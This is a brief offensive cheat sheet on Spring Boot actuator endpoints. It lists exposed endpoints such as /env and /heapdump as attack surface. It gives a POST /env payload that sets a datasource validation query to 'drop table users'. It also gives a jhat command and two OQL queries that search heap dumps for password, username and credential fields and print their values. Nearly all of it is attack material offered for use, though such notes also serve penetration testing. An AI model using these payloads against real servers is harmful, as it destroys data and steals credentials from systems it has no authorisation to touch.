


# Spring boot



Spring boot app can contain many vulnerabilities if the server is not well configured
This endpoints are vulnerable :

-   **/autoconfig**  - Displays an auto-configuration report showing all auto-configuration candidates and the reason why they 'were' or 'were not' applied.
-   **/beans**  - Displays a complete list of all the Spring beans in your application.
-   **/configprops**  - Displays a collated list of all @ConfigurationProperties.
-   **/dump**  - Performs a thread dump.
-   **/env**  - Exposes properties from Spring's ConfigurableEnvironment.
-   **/health**  - Shows application health information (a simple 'status' when accessed over an unauthenticated connection or full message details when authenticated).
-   **/info**  - Displays arbitrary application info.
-   **/metrics**  - Shows 'metrics' information for the current application.
-   **/mappings**  - Displays a collated list of all @RequestMapping paths.
-   **/shutdown**  - Allows the application to be gracefully shutdown (not enabled by default).
-   **/trace**  - Displays trace information (by default the last few HTTP requests)
-  **/heapdump** return .hprof file
-  **/actuators** 
- **/jolokia** 

## /env exploit

 - We can modify configprops properties via POST request

> POST /env HTTP/1.1
> properties=new_properties

 - Perform sql query
 
 > POST /env HTTP/1.1
> spring.datasource.tomcat.validationQuery=drop+table+users

## Analyze .hprof file

  

>  jhat -port 7401 -J-Xmx4G /tmp/file.hprof

Usefull OQL querys:

	select filter(map( map(filter(heap.classes(), function(it) { var interests = /login|password|username|database|creds|credential|p4ss|l0g1n|l0gin|us3r|admin|4dm1n/; for(field in it.fields) if(interests.test(it.fields[field].name.toLowerCase())) return  true; return  false; }), "heap.objects(it, true)"), function(it) { var res = ""; var interests = /login|password|username|database|creds|credential|p4ss|l0g1n|l0gin|us3r|admin|4dm1n/; while (it.hasMoreElements()) { it = it.nextElement(); for(field in it) { if(interests.test(field.toLowerCase())) { if(res !== '') res += ', '; res += field + ' : ' + (it[field] ? (it[field].value ? it[field].value.toString() : it[field].toString()) : it[field]); } } } return res; }), "it");

and

    select filter( map(filter(heap.classes(), "it.statics"), function(it) { var res = ''; var interests = /login|password|username|database|creds|credential|p4ss|l0g1n|l0gin|us3r|admin|4dm1n/; for (field in it.statics) { if(interests.test(field.toLowerCase())) { if(res !== '') res += ', '; res += field + ' : ' + it.statics[field].toString(); } } return res; } ), "it");

   
   

